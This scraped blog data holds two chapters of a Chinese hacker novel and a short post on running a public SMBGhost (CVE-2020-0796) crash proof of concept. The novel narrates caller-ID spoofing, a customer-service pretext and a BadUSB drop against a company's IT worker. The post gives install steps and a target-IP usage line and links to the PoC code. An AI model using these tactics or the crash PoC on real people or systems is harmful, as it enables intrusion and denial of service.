\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;入侵的路从来就不是平坦的，这取决实施入侵的人。黑客通常会找到别人看不到的路通往最终的目标。而这次是一个庞大的集团，尽管入口可能很多，但是许多条路都纷繁复杂，有些甚至可能是甜蜜的陷阱，又或者是达不到最终的终点。&lt;/p&gt;\n&lt;p&gt;面对如此庞大的集团，除了自动化的信息收集系统，需要大量的人为的将这些信息进行提取、组合，制定入侵的方案。从而用最短的事件达到目标。盲目的去乱碰无异于浪费时间与生命。&lt;/p&gt;\n&lt;p&gt;是否是因为最近几个月拒绝了任务让自己做出如此不合常规的操作？王梓内心中开始嘲笑起自己之前的愚蠢做法。这种情况对于一名职业网络杀手来说是一个危险的信号。他不得不重视起来并将自己紧绷起来，在内心中，此次的入侵绝对不能掉以轻心。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;将此次目标输入到信息收集的系统中。王梓面前的屏幕上显示着缓慢增长的进度条，在这简单的界面的背后却有数个分布在不同地点的服务器对网络中的无数交织起来的网络发出信息刺探的比特串。这也预示着一场网络攻击即将发生。没有人知道这网络攻击背后将会带来什么？&lt;/p&gt;\n&lt;p&gt;王梓在国外的社交网络中看到关于HH集团不好的传言消息，而这样的消息在国内的网站中均看不到。而就在最近国家对国外网站的封锁力度增加了。要想翻墙去看到这类消息更加的困难。这背后是一种怎样的势力在操控着，这更加令人好奇。&lt;/p&gt;\n&lt;p&gt;21世纪是一个飞速发展的时代，这个时代信息发达的程度惊人，信息的容量超过之前几千年的总和，并且每年还在翻倍的增长。国家对网络安全威胁高度重视，加快并促进了网络安全事业的建设。这对于从事网络安全行业的人是一个极好的消息，而对黑色产业来说则无疑又增加了成本。但是无论怎样，黑色产业总会以你意想不到的方法巧妙的绕过。而这两者之间是高度依赖的，如果没有黑色产业的存在，那么也不会有网络安全行业。世界就是这样的矛盾存在，而矛盾存在的根本在于这是由一个矛盾主体（人）控制的世界。&lt;/p&gt;\n&lt;p&gt;从音响中发出“叮叮叮”的声音，屏幕上显示着：“你的信息收集完毕！”。王梓点击开，一幅拥有众多数据信息树形结构图展现出来。这么多的信息王梓经过了一夜的时间将起提取并梳理了出来。当完成的那一刻，王梓伸了一个懒腰，看一下时间，已经是清晨六点，窗外还是漆黑的一片。“看来今天不能够去练拳了” 王梓自言自语道。&lt;/p&gt;\n&lt;p&gt;王梓将主要目标锁定在集团高层以及高层的秘书，另外还有网络的运维人员，他通过搜索引擎中意外获取到一份集团内部通讯录。与王梓构建的社工库进行结合，很快便得到了相关人员的关键信息。攻击高层更加直接，如果不行，在通过运维人员那里获得到集团大多数的服务器权限，方便从内部获取资料。&lt;/p&gt;\n&lt;p&gt;又通过一个上午的忙碌，最终将目标锁定在了两个人身上，一个叫白兰，25岁，HH集团董事长其中一位秘书。另外一个叫卫祺福，28岁，HH集团运维人员。通过上午的收集，王梓掌握了这两个人的习惯，基础信息，以及最近两个人的状况，当然还包括住址，而且两个人都是喜欢发自拍照的人。在现在的网络中，社交软件上充斥着大量的个人自拍照和一些带有位置的隐私信息。对于黑客来讲这样的信息至关重要，对自己的攻击将会带来极大的方便。&lt;/p&gt;\n&lt;p&gt;卫祺福正在京东的网站上查看u盘的内容，因为他最近刚买不久的u盘就坏掉了，他去卖家的地方给了一个差评。而他这次挑选u盘十分的谨慎。他还在网络中的专业论坛发帖说这件事情。此时，他的电脑响了起来。他接通了电话，电话那边传来了一个人男人的声音。&lt;/p&gt;\n&lt;p&gt;“您好，请问是卫先生嘛？”&lt;/p&gt;\n&lt;p&gt;“我是，你是哪位？”&lt;/p&gt;\n&lt;p&gt;“我是东升科技的客服人员小赵，我看到您给我们的一款产品给了差评，并说我们的质量存在严重的问题。我想跟您了解一下情况。”&lt;/p&gt;\n&lt;p&gt;“你们的u盘，我买了才1个月就坏掉了，而且你们客服说维修不了。太耽误我的事了。”&lt;/p&gt;\n&lt;p&gt;“对此我感到万分的抱歉，u盘属于易损物品，但是我们都是经过产品合格检查的，出现您这种概率实在是属于小概率时间。另外，坏掉跟您的使用也有关系。”&lt;/p&gt;\n&lt;p&gt;“这么说你是赖我自己喽？”&lt;/p&gt;\n&lt;p&gt;“不是的，您看这样行不行，我给您重新寄一块新的u盘，您把差评去掉可以不？”&lt;/p&gt;\n&lt;p&gt;“我已经不再相信你们的产品了。”&lt;/p&gt;\n&lt;p&gt;“我们的硬盘绝对是正品，而且是大厂的，出现您的这种情况，实在是属于意外，极小概率的事件。我们给您补偿一个新的。如果我们的u盘再出现问题，您再考虑更换其他的不是更好。”&lt;/p&gt;\n&lt;p&gt;“那你们在给我发一款新的吧。” 卫祺福想了想也是，这样能省下不少的钱。&lt;/p&gt;\n&lt;p&gt;“好的，我们就按照原来的地址发一个同样的新的。另外还请您配合一下，把您原来的有问题的寄回来，我们要进行检查。”&lt;/p&gt;\n&lt;p&gt;“我要寄到哪里？邮费是你们出吧？”&lt;/p&gt;\n&lt;p&gt;“对的，您寄到*地址，收件人小赵，电话166123692181（随便编的号码），您寄出后，我们会第一时间给您寄送新的u盘。还请您把差评去掉。谢谢！”&lt;/p&gt;\n&lt;p&gt;“我收到新的u盘在给你们去掉差评。”&lt;/p&gt;\n&lt;p&gt;“好的”。&lt;/p&gt;\n&lt;p&gt;卫祺福将电话挂掉，他怀疑事情可能没这么简单，他又特地去查了下来电号码确认是否是官方客服。他看到来电与店铺电话一致便打消了念头。他预约了快递准备硬盘寄出去。&lt;/p&gt;\n&lt;p&gt;王梓这边传来了电话挂断的声音。他微笑了一下，看来鱼儿已经上钩了。他使用了来电电话号码欺骗的软件，并伪装了客服人员获取到了这名大集团企业运维人员的信任。一扇大门即将向他敞开。&lt;/p&gt;\n&lt;p&gt;第二天，王梓就收到了卫祺福寄回来的有问题的u盘。王梓将其拆开，将其芯片取出。他将准备好的badusb的芯片放入到u盘的外壳中。该芯片在插入电脑的时候会执行恶意的远程控制程序。制作完成后，王梓在中关村电脑城购买了一模一样的新u盘。&lt;/p&gt;\n&lt;p&gt;王梓使用来电显示欺骗拨通了卫祺福的电话。&lt;/p&gt;\n&lt;p&gt;“您好，我是东升科技的客服，您的u盘我们已经收到，我们这边已经利用技术手段对u盘进行了修复。另外，我们为了保障你的使用，我们特意准备了一个新的u盘给您。还麻烦您把差评给删除掉。”&lt;/p&gt;\n&lt;p&gt;“我拿到u盘之后看看在说。”&lt;/p&gt;\n&lt;p&gt;“好的，u盘今 天会为您寄出，最迟3天收到。请您注意查收。”&lt;/p&gt;\n&lt;p&gt;过了两天，王梓将两个u盘分别贴上了标签，进行区分并打包好。装进了一个纸盒中，密封好，紧接着将从快递公司拿到的快递单，将对方信息全部填写好。穿上了一身红颜色的京东快递服装。戴上一顶帽子，压的较低。一切都已经准备好，开始出发。&lt;/p&gt;\n&lt;p&gt;平静如往常，在到达HH集团楼下，王梓拨通了卫祈福的电话。&lt;/p&gt;\n&lt;p&gt;“您好，京东快递，有您的快件到了，麻烦下楼来取下。”&lt;/p&gt;\n&lt;p&gt;“好的，我这就下去。”&lt;/p&gt;\n&lt;p&gt;此时的王梓与其他快递员在一起，他蹲在具有好多快递的面前，手里的电话贴在耳边。不一会儿，卫祺福就来到了王梓面前。他对王梓说：“卫祺福的快递”。王梓抬头看了他一眼，然后将u盘递给他，并要求他签收。等到卫祺福上楼后，王梓也随即离开这里。&lt;/p&gt;\n&lt;p&gt;卫祺福拿到了新的u盘，并且又多了一个u盘。他心中有些开心。脸上不自觉的漏出浅浅的微笑。他回到工位，便立即尝试u盘是否好使，将u盘插入电脑，过了5秒钟，桌面右下角弹出了新硬件接入的提示窗。就在这5秒中，远程控制程序已经植入到了卫祺福的电脑中。王梓的控制端中又多出了一台肉鸡。此时的王梓正在回家的路上，路上还可以见到一些人群人拖着行李，走在这寒冷的冬季里。他们的眼神暗淡，透出些许迷茫并带着失望。王梓不知道他们将要去哪里，也不知道为什么会这样。而现在对啊来说最重要的就是回到家中。早日发现深深隐藏在这座城市甚至国家的秘密。&lt;/p&gt;\n&lt;h2 id=\&#34;说明\&#34;&gt;说明&lt;/h2&gt;\n&lt;p&gt;1. 通过搜索引擎获取通讯的案例主要来自2013年曾经如家整个集团通讯录可以通过搜索引擎搜索。通讯录泄漏了集团级集团下属企业人员及职能和联系信息。&lt;/p&gt;\n&lt;p&gt;2. 社工的思路来源于范建中的《黑客社会工程学攻击》一书的案例。&lt;/p&gt;\n&lt;p&gt;3. 网络中有售卖来电显示欺骗的收费软件。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Eight&#34;,&#34;abstract&#34;:&#34;&lt;pre&gt;&lt;code&gt;这是一个最好的时代，这是一个最坏的时代；\n\n这是一个智慧的年代，这是一个愚蠢的年代；\n\n这是一个光明的季节，这是一个黑暗的季节；\n\n这是希望之春，这是失望之冬；\n\n人们面前应有尽有，人们面前一无所有；\n\n人们正踏上天堂之路，人们正走向地狱之门。\n\n　　                        ——《双城记》狄更斯 \n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;入侵的路从来就不是平坦的，这取决实施入侵的人。黑客通常会找到别人看不到的路通往最终的目标。而这次是一个庞大的集团，尽管入口可能很多，但是许多条路都纷繁复杂，有些甚至可能是甜蜜的陷阱，又或者是达不到最终的终点。&lt;/p&gt;\n&lt;p&gt;面对如此庞大的集团，除了自动化的信息收集系统，需要大量的人为的将这些信息进行提取、组合，制定入侵的方案。从而用最短的事件达到目标。盲目的去乱碰无异于浪费时间与生命。&lt;/p&gt;\n&lt;p&gt;是否是因为最近几个月拒绝了任务让自己做出如此不合常规的操作？王梓内心中开始嘲笑起自己之前的愚蠢做法。这种情况对于一名职业网络杀手来说是一个危险的信号。他不得不重视起来并将自己紧绷起来，在内心中，此次的入侵绝对不能掉以轻心。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第八章 时代&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;社会工程学&#34;,&#34;slug&#34;:&#34;Jei_j_MFTXr&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/Jei_j_MFTXr/&#34;}],&#34;date&#34;:&#34;2020-03-20 13:52:15&#34;,&#34;dateFormat&#34;:&#34;2020-03-20&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Eight.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Eight/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;10 min read&#34;,&#34;time&#34;:565000,&#34;words&#34;:2794,&#34;minutes&#34;:10},&#34;description&#34;:&#34;这是一个最好的时代，这是一个最坏的时代；\n\n这是一个智慧的年代，这是一个愚蠢的年代；\n\n这是一个光明的季节，这是一个黑暗的季节；\n\n这是希望之春，这是失望之冬；\n\n人们面前应有尽有，人们面前一无所有；\n\n人们正踏上天堂之路，人们正走向地狱之...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%B4%E6%98%8E\&#34;&gt;说明&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;strong&gt;我们生活在一个由少数精英制定规则的世界里。他们左手握着权力，右手握着巨大的财富。他们背后拥有一个庞大的体系，权力与财富的相辅相成，控制了整个世界。我们生活在一个看似自由，实则处处受规则限制的世界。而黑客的存在的，就是寻求真正的自由来打破规则。实现突破，自由，平等，随意。&lt;/strong&gt;&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584595916360.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在小区附近的公园某处角落内，有一群身穿武术服的一群人，他们动作缓慢的打着拳，旁边一台不是很大的音箱正放着《高山流水》的曲子。在着一群人中除了王梓，其他全部都是老年人。由于他刚刚开始练习，而师傅每天只教他两个动作，许多动作不会，在人群中格外的显眼，来公园里遛弯的大爷大妈腻都纷纷看向王梓，而王梓则只专心的看着大家怎么做，自己依葫芦画瓢跟着做。大爷大妈们都很喜欢这位小伙子，有些看到王梓做的不对的地方，或过来教一下。这样的天气里，每天两个小时的练习，每次练完几乎全身都湿透了，这感觉让王梓觉得十分的轻松，缓解了他的情绪和压力。而王梓也开始改掉了自己昼伏夜出的习惯，彷佛开始过上了正常人的生活。&lt;/p&gt;\n&lt;p&gt;对方已经支付了订金，王梓也开始真正的忙碌起来。这在他接过的所有单子里从来没有遇到过的事情。在王梓的心中充满疑惑，好奇心使他非常想知道是什么样的文件和名单可以这么值钱。而对方又是什么人？为什么愿意花这么高的价格要这个东西呢？王梓想要尽快完成任务，他更想看到这背后隐藏着的真相。&lt;/p&gt;\n&lt;p&gt;此时王梓电脑屏幕上显示的HH集团的官网，他将网站输入到自己的大数据信息汇聚系统中，随着进度条不段的前进，页面上显示的关于HH集团的ip地址和域名的信息也在不断增多。在王梓右手边的屏幕里，王梓将汇聚出的ip地址放入到47RAT的远程控制软件里去进行搜索，47RAT是王梓花了高价钱找了一位编程高手开发的一套远程控制系统。随着搜索进度完成，47RAT显示出两个ip地址。王梓点击ip，开始翻开这两个ip里的文件，他发现这仅仅是两台放着不重要业务系统的服务器，其中有一台ip地址连接到了内网。这是个一件不错的事情，王梓嘴上漏出微笑，他内心想着：“这次运气不错，看来很快就可以发现目标。“。王梓打开文件传输对话框，将一个名为EternalBlue.exe文件拖动了上去，同时又到开了一个黑色窗口。王梓快速的输入了EternalBlue.exe，白色的字符开始一行行显示着，王梓转身准备去给自己倒一杯咖啡。&lt;/p&gt;\n&lt;p&gt;突然，放在沙发上的手机亮了起来，上面显示着小楠的电话号码，紧接着响起王梓多年未变的手机铃声。王梓走过去，接起电话。&lt;/p&gt;\n&lt;p&gt;“嘿，傻瓜，最近忙什么呢？都不见你人。” 电话那边传来了熟悉而又亲切的声音，这声音一直都是王梓最喜欢听到的声音。&lt;/p&gt;\n&lt;p&gt;“我最近在学太极拳，比较笨，所以多花了些时间练习。”&lt;/p&gt;\n&lt;p&gt;“你这是步入老年人的生活节奏了啊。请问您老贵庚啦～”小楠语气里略带了些调侃。&lt;/p&gt;\n&lt;p&gt;“你呢？最近怎么样？” 王梓嘿嘿一笑，然后用很温柔的语气关心起小楠。&lt;/p&gt;\n&lt;p&gt;“我当然一直很好啦。我呀，是看咱们好久没联系，看看你这个傻子过的怎么样。”&lt;/p&gt;\n&lt;p&gt;“我自己挺好的，现在已经都不赖床了呢。”&lt;/p&gt;\n&lt;p&gt;这时的王梓已经拿着电话走到了窗前，他看到外面天空不远处有一片乌云，正在向他这边一点点的靠近。&lt;/p&gt;\n&lt;p&gt;“我看现在这天气过不了多久就要下雨了，你带伞了没有呢？”&lt;/p&gt;\n&lt;p&gt;小楠看了一眼自己包里的伞，然后对王梓说：”啊，我不知道今天下雨，没带伞呢。“&lt;/p&gt;\n&lt;p&gt;王梓看了看时间，此时，也正是快到小楠下班的时间了。&lt;/p&gt;\n&lt;p&gt;”我看你也快下班了，我这就给你去送伞。“&lt;/p&gt;\n&lt;p&gt;”好，你过来吧。那先挂了，见面在说哦。”&lt;/p&gt;\n&lt;p&gt;两人互相说了再见，小楠从包里掏出雨伞，对着旁边的同事说：“小梅，我看一会就要下雨了，你带伞了没？我这里有两把，你要没带，我可以借你一把。”&lt;/p&gt;\n&lt;p&gt;“没带，那还真是太谢谢啦。”小梅微笑着对小楠说谢谢。&lt;/p&gt;\n&lt;p&gt;王梓带着两把伞出门了。阴暗的天，带给人一种沉闷感，或许会引起许多人的感伤。&lt;/p&gt;\n&lt;p&gt;天空中开始掉雨点，王梓打开一把黑色的伞。走到小楠公司附近的一个十字路口，有断断续续的雨点变成了毛毛雨，王梓撑着伞站在十字路口等着红灯，远处一家店的放着音乐：“湿答答的下雨天，一个人站在对街，彷佛在等着谁……”。王梓透过来往的车辆看到马路对面的人群中的小楠，而就在此时小楠也看到了王梓，小楠朝王梓挥挥手。王梓也举起手回应。路灯上的数字在缓慢的倒数着。小楠左右看看来往的车辆，在看看路灯。终于等到了绿灯，由于拎着包，小楠只能小步快跑，此时的小楠在王梓的眼里很是可爱，王梓也更加心疼，也跑向小楠。&lt;/p&gt;\n&lt;p&gt;小楠到了王梓的伞下，对王梓说：“没想到这么快就下起了雨。”。&lt;/p&gt;\n&lt;p&gt;“你怎么提前出来了，给你拿的伞。”。王梓赶忙把伞递过去。&lt;/p&gt;\n&lt;p&gt;“人家工作了一天，累了哦。咱俩就用一个吧。”&lt;/p&gt;\n&lt;p&gt;“听说下雨天跟火锅更配哦～咱们去吃火锅吧～”&lt;/p&gt;\n&lt;p&gt;“哇，好啊～我最爱吃的火锅，好久没吃啦”。&lt;/p&gt;\n&lt;p&gt;两个人转身向火锅店走去。王梓右手拿着伞，而小楠不知道什么时候挽起了王梓的胳膊。两人就这样走在雨中。还能听到那家店放着的音乐。&lt;/p&gt;\n&lt;p&gt;我是你的绝对 (你是我的一切)&lt;/p&gt;\n&lt;p&gt;带你通往那幸福的终点线&lt;/p&gt;\n&lt;p&gt;你要的是晴天&lt;/p&gt;\n&lt;p&gt;送你一把伞 (别忘这把伞)&lt;/p&gt;\n&lt;p&gt;是缘份吗? 当我看着你的眼睛&lt;/p&gt;\n&lt;p&gt;整个世界彷佛都触电 像烟火点亮这片黑夜&lt;/p&gt;\n&lt;p&gt;静止的时间 幸福的瞬间&lt;/p&gt;\n&lt;p&gt;…………&lt;/p&gt;\n&lt;p&gt;歌声一点点消失在天空……&lt;/p&gt;\n&lt;p&gt;外面下着雨，王梓和小楠吃着火锅，两个人聊的也很开心。而时间也过的很快，两个人吃完后，外面的雨也停了。刚刚下过雨的夜晚的，伴着微风，舒服极了，两个人在路边漫步。&lt;/p&gt;\n&lt;p&gt;“如果我要不联系你，你是不是就不会主动联系我？” 小楠突然有些责备和质问的意思问王梓。&lt;/p&gt;\n&lt;p&gt;王梓先是一愣，他不知道该怎么跟小楠解释，最后脱口说出：“没有啊”。&lt;/p&gt;\n&lt;p&gt;而小楠微微一笑说：“没事，走吧。”&lt;/p&gt;\n&lt;p&gt;而接下来两个人默契的都沉默起来，王梓低着头走着，而小楠则看看路过，看看过往的车辆。&lt;/p&gt;\n&lt;p&gt;走到小楠家的楼下。小楠对王梓说：“我到家了，我上楼了，谢谢你的火锅哦～”。&lt;/p&gt;\n&lt;p&gt;“不客气～那我就回去了，你早点休息。”&lt;/p&gt;\n&lt;p&gt;“你也是，拜拜～”&lt;/p&gt;\n&lt;p&gt;“拜拜～”&lt;/p&gt;\n&lt;p&gt;在名为爱情的游戏中，女人负责勾引，男人负责进攻。有时候你认为是你自己追到的，其实不过是女人一开始也对你有意。而现实生活有趣的是，你明明知道，但是你却依然要装作什么都不知道。对于王梓与小楠，注定不可能。王梓边走边思考着，不知不觉走到了自己家小区楼门口，一对情侣正相拥在一起，恋恋不舍。由于两个人几乎把门口堵住，而且丝毫没有让地方的意思。还好王梓不胖，只好侧身进去。&lt;/p&gt;\n&lt;p&gt;回到家中，显示器中显示已经扫描完成。王梓看了下结果，发现远程控制的软件中又新增加了几台的计算机。但是由于是晚上，基本都下班了，都处于离线状态。&lt;/p&gt;\n&lt;p&gt;一点进展没有，王梓叹了一口气。&lt;/p&gt;\n&lt;p&gt;“这样漫无目的乱打，效率实在太低。应该聚焦，应该直奔主要目标”王梓心想。&lt;/p&gt;\n&lt;p&gt;而最近，随着国内的网络安全法实施，对vpn的限制和打击，某地公安部门已经发布有人因使用vpn而被捕的声明。对王梓构建的反追踪系统造成一定的影响。王梓为此对其进行了改造。而其实让王梓想不到的是，他此次的入侵行动，竟然跟这些有着不可思议的关联。而此时的王梓还不知情。面对此次的目标，在有限的条件中，王梓开始了他新的计划。&lt;/p&gt;\n&lt;h2 id=\&#34;注解\&#34;&gt;注解&lt;/h2&gt;\n&lt;p&gt;这里提出了一个想法，就是结合全网的数据配合第一时间披露的漏洞批量植入后门，自动提升权限，植入rootkit。这样即使修复了补丁，权限依然在手里掌握着。rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。&lt;/p&gt;\n&lt;p&gt;另外本小说剧情是虚构的，但是以真实的黑客技术来写。对文中技术不当之处，欢迎与我交流。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Seven&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;&lt;strong&gt;我们生活在一个由少数精英制定规则的世界里。他们左手握着权力，右手握着巨大的财富。他们背后拥有一个庞大的体系，权力与财富的相辅相成，控制了整个世界。我们生活在一个看似自由，实则处处受规则限制的世界。而黑客的存在的，就是寻求真正的自由来打破规则。实现突破，自由，平等，随意。&lt;/strong&gt;&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第七章 X计划&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;}],&#34;date&#34;:&#34;2020-03-19 13:30:50&#34;,&#34;dateFormat&#34;:&#34;2020-03-19&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Seven.png&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Seven/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;9 min read&#34;,&#34;time&#34;:523000,&#34;words&#34;:2604,&#34;minutes&#34;:9},&#34;description&#34;:&#34;我们生活在一个由少数精英制定规则的世界里。他们左手握着权力，右手握着巨大的财富。他们背后拥有一个庞大的体系，权力与财富的相辅相成，控制了整个世界。我们生活在一个看似自由，实则处处受规则限制的世界。而黑客的存在的，就是寻求真正的自由来打破规则...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B3%A8%E8%A7%A3\&#34;&gt;注解&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584521689217.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;使用方法：&lt;/p&gt;\n&lt;p&gt;安装impacket库&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;git clone https://github.com/SecureAuthCorp/impacket.git\ncd impacket\npython setup.py install\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;直接使用pip安装的不行，所以clone最新版本的，然后安装，在Mac系统下需要sudo权限。&lt;/p&gt;\n&lt;p&gt;安装成功后，下载该代码。执行如下命令：&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;python gistfile1.py 目标IP&lt;/p&gt;\n&lt;p&gt;运行后效果：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584521675133.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;代码下载地址：&lt;a href=\&#34;https://github.com/insightglacier/SMBGhost_Crash_Poc\&#34;&gt;https://github.com/insightglacier/SMBGhost_Crash_Poc&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;代码原始地址(需翻墙)：&lt;a href=\&#34;https://gist.github.com/asolino/45095268f0893bcf08bca3ae68a755b2\&#34;&gt;https://gist.github.com/asolino/45095268f0893bcf08bca3ae68a755b2&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;作者twitter :&lt;a href=\&#34;https://twitter.com/agsolino\&#34;&gt;https://twitter.com/agsolino&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;smbghost-crash-poc&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584521689217.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;使用方法：&lt;/p&gt;\n&lt;p&gt;安装impacket库&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;git clone https://github.com/SecureAuthCorp/impacket.git\ncd impacket\npython setup.py install\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;直接使用pip安装的不行，所以clone最新版本的，然后安装，在Mac系统下需要sudo权限。&lt;/p&gt;\n&lt;p&gt;安装成功后，下载该代码。执行如下命令：&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34; SMBGhost 蓝屏代码（测试成功）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;smbghot&#34;,&#34;slug&#34;:&#34;ay78UcHaa7i&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ay78UcHaa7i/&#34;},{&#34;name&#34;:&#34;cve-2020-0796&#34;,&#34;slug&#34;:&#34;-mnvPQe4EUP&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-mnvPQe4EUP/&#34;},{&#34;name&#34;:&#34;poc&#34;,&#34;slug&#34;:&#34;SuVox-SheX7&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/SuVox-SheX7/&#34;},{&#34;name&#34;:&#34;crash&#34;,&#34;slug&#34;:&#34;7koXLajjEUB&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7koXLajjEUB/&#34;}],&#34;date&#34;:&#34;2020-03-18 16:54:13&#34;,&#34;dateFormat&#34;:&#34;2020-03-18&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/smbghost-crash-poc/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:35000,&#34;words&#34;:139,&#34;minutes&#34;:1},&#34;description&#34;:&#34;CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.\n\n使用方法：\n安装impacket库\ngit clone https://github.com/SecureAuthCo...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;strong&gt;自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。&lt;/strong&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584521521472.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;夜深了，天气有些阴沉，有些发闷，让人感觉呼吸困难。路上还有几个刚刚下班的人往家里走，他们看上去有些疲惫，不时有几辆车呼啸而过。没过多久，狂风大作，电闪雷鸣，路边的树枝开始疯狂的摇头。很快无情的雨点从天空中落下，打在了正在赶路人的身上，人们纷纷拿着自己的包顶在头顶奔跑起来。这突如其来的一场大雨，拦住了深夜要赶回家的人，也惊醒了许多刚刚入睡的人们，还有那些害怕打雷无法入睡的人们。&lt;/p&gt;\n&lt;p&gt;风雨总是短暂的，下了一整夜的雨，清晨的空气变得清新起来，王梓伸了一个懒腰，然后拉开了窗帘，外面的阳光飞速的跑进屋内，填满整个卧室。打开窗，一股清爽的空气扑面而来，瞬间让人神清气爽。风雨过后总是会迎来美好，又或者给人们带来些许惊喜，比如雨后彩虹。&lt;/p&gt;\n&lt;p&gt;在这样一个美好的早晨，给人的心情也自然是不一样的，王梓准备下楼去公园转转。宅了许久，也应该出去呼吸一下外面的新鲜空气了。简单洗漱下，换了件宽松的衣服王梓救下楼了。&lt;/p&gt;\n&lt;p&gt;公园内都是些年纪较大的人，有的在空地上打羽毛球，有的老大爷站在树旁，不断用自己侧面的身体撞向树，然后弹回来，在撞过去，一会在用后背重复刚才的动作。有的老大妈则站在树下练习着嗓子。王梓心里想着当自己老了的时候是否也是差不多的样子，想想，自己摇摇头笑了。继续向前走，不远处可以看到有一群老年人，他们动作轻柔又缓慢，有的还穿着武术服，旁边